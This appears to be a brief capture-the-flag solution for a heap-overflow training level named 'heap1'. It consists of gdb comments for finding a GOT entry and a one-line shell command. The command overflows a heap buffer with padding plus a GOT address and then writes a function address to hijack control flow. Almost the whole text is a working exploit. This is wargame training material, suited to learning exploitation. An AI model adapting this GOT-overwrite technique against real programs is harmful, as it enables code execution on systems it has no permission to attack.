# get address of puts via breakpoing at the end
# disassemble 0x080483cc
# x 0x08049774

./heap1 `python -c "print 'A' * 20 + '\x74\x97\x04\x08'"` `python -c "print '\x94\x84\x04\x08'"`